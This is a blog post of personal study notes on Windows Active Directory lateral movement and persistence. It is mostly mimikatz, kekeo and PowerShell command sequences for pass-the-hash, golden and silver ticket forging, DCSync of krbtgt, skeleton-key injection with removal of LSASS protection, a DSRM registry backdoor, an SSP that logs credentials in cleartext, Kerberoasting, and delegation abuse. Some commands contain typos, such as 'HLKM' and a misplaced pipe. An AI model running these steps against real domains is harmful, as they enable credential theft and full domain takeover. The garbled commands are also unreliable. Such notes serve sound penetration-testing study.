---
title: "4 - Windows Lateral Movement"
classes: single
header:  
  teaser: /assets/images/posts/adx/adx-teaser4.jpg
  overlay_image: /assets/images/main/header4.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Intro to Windows Lateral Movement"
description: "Intro to Windows Lateral Movement"
categories:
  - notes
  - adx
tags:
  - beginner
  - AD
  - Windows 
toc: true
---

# Lateral Movement

Double-Hop:
```powershell
Impacket SMbServer
WsgiDav - server WebDav
Invoke-TmpDavFS
```


## PSRemoting

> Local admin required

```powershell
Enable-PSRemoting -Force
```

without saving: 
```powershell
Enter-PsSession -ComputerName <computer>
```

saving session:
```powershell
$sess = New-PsSession -ComputerName <computer>
Enter-PsSession -Session $sess
```

> both are executed in **wsmprovhost** process

To execute to many machines: **Invoke-Command**


Example:
```powershell
Invoke-Command -ComputerName <computer> -Credential <user> -ScriptBlock {whoami}
Invoke-Command -ScriptBlock {whoami;hostname} -Credential <user> -ComputerName (Get-Content .\Desktop\computerlist.txt)
Invoke-Command -FilePath <path\script.ps1> -Credential <user> -ComputerName (Get-Content .\Desktop\computerlist.txt) or -Session <$sess>
```

Execute functions that were imported locally in remote machines:
```powershell
Invoke-Command -ScriptBlock ${function:<name>} -ComputerName <computer>
```


## Over Pass the Hash

> With hashes in hand we can use mimikatz or invoke-mimikatz

```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<cmd>

Invoke-Mimikatz -Command ‘ “command” ’
```


## Golden Ticket
```powershell
Mimikatz # lsadump::lsa /patch
```


Strategy:

1. bypass AMSI
2. bypass ExecutionPolicy
3. import mimikatz
4. open session in DC
5. bypass AMSI in DC
6. execute ScriptBlock remotely with Invoke-Command -Session $sess -ScriptBlock  ${Function:Invoke-Mimikatz ‘ "lsadump::lsa /patch" ’}
7.  with krbtgt in hands we can execute the golden ticket

```powershell
Mimikatz # kerberos::golden /user:<user> /domain:<domain FQDN> /sid:<domain SID> /krbtgt:<hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt or /ticket to save in file
```

   
> RID and Group it will be: *513*, *518*, *519*, *520*
> time in minutes 

8. Invoke-Mimikatz -Command ‘ “golden ticket command” ’


## DCSync

> DA is required
> Can run anywhere

> stealthy

```powershell
Mimikatz # lsadump::dcsync /user:<fqdn or netbios>\krbtgt
Invoke-Mimikatz ‘"lsadump::dcsync /user:<fqdn or netbios>\krbtgt" ’
```


## Silver Ticket

Forging a TGS

```powershell
Mimikatz # kerberos::golden /user:<user> /domain:<domain FQDN> /sid:<domain SID> /target:<target machine> 
   /service:<required service> /rc4:<hash> /ptt 
```

We can request services like:
```powershell
- HOST
- RPCSS
- WSMAN
- TERMSRV
- CIFS
- LDAP
- HTTP
```

## Skeleton Key

> patch a process of LSASS in the DC and with that we can access any user with a uniq password (mimikatz)

> required to be executed in the DC with a priv user

```powershell
Mimikatz # misc::skeleton
```

example usage:
```powershell
Invoke-Mimikatz -ScriptBlock ${Function:Invoke-Mimikatz} -Session $sess
Enter-PsSession -ComputerName <computer> -Credential <user fqdn> //password: mimikatz
```

Alternative to bypass protection of LSASS:

> Modifications on a kernel level is required, mimikatz must be on disk of DC machine

```powershell
Mimikatz# privilege::debug
Mimikatz# !+
Mimikatz# !processprotect /process:lsass.exe /remove
Mimikatz# misc::skeleton
Mimikatz# !-
```


## DSRM

> SafeModePassword - when u promote a server to DC


> DA required

```powershell
Mimikatz# token::elevate
Mimikatz# lsadump::sam
```

first:
```powershell
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD

Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

then:
```powershell
Mimikatz# sekurlsa::pth /domain:dc (dc hostname) /user:Administrator /ntlm:<hash> /run:powershell.exe
```

Downsides:
```powershell
• We can access via PSRemoting
• we can access via RDP:

PS> mstsc /admin
```

GoodSides:
```powershell
# we can execute the DCSync and Golden Ticket afterwards
Mimikatz # lsadump::dcsync /user:krbtgt /domain<domain FQDN or netbios> /dc:<hostname> 
```
 

## SSP

dynamic library (DLL)

> mimikatz has mimilib.dll

add the dll file on system32 and create a referente on register
```powershell
PS> $tools = Get-ItemProperty HLKM:\System\CurrentControlSet\Control\Lsa\OSConfig\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’

$tools += ‘mimilib’

Set-ItemProperty HLKM:\System\CurrentControlSet\Control\Lsa\OSConfig\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’ -Value $tools

Set-ItemProperty HLKM:\System\CurrentControlSet\Control\Lsa\ -Name ‘SecurityPackages’ | select -ExpandProperty ‘Security Packages’ -Value $tools
```

after the modification:

2 options:
```powershell
Mimikatz# misc::memssp
# all credentials gonna be stored in cleartext on kiwissp.log file
```


## Kerberoast

> Crack the password offline from the TGS

klist = can list all tickets in memory

enum the all services:
```powershell
1. setspn -Q */* 
```

select account of user:
```powershell
2. Get-NetUser -SPN
```

we can also ask for a ticket manually:
```powershell
2. Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN Name>
```

> with the ticket in memory, we can export the ticket to a file

```powershell
Mimikatz# kerberos::list /export
```

two tools for cracking the ticket:
```powershell
1. TGSRepCrack
  python.exe .\tgsrepcrack.py <wordlist> <file.kirbi>

2. Kirbi2john
```


## Kerberoast Delegation

### Unconstrained Delegation

```powershell
> Powerview
Get-NetComputer -UnConstrained
```

```powershell
> ADmodule
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

Mimikatz# sekurlsa::tickets /export
Mimikatz# kerberos::ptt <path to the ticket>
```

### Constrained Delegation
```powershell
- S4U2self > Trusted_To_Authenticate_For_Delegation
- S4U2proxy > msDS-AllowedToDelegateTo
```

Discover:
```powershell
> Powerview
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
```

```powershell
> ADmodule
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne “$null”} -Properties msDSAllowedToDelegateTo
```

Exploit:

ask fot tgt and save it in a file:
```powershell
kekeo# tgt::ask /user:<user> /domain:<FQDN> /rc4:<hash>
Mimikatz# kerberos::ptt <path to ticket>
```

last step:
```powershell
kekeo# s4u /tgt:<path to ticket> /user:<user to be impersonificated@fqdn> /service:<service that the user has trust>
Mimikatz# kerberos::ptt <path to TGS>
```


 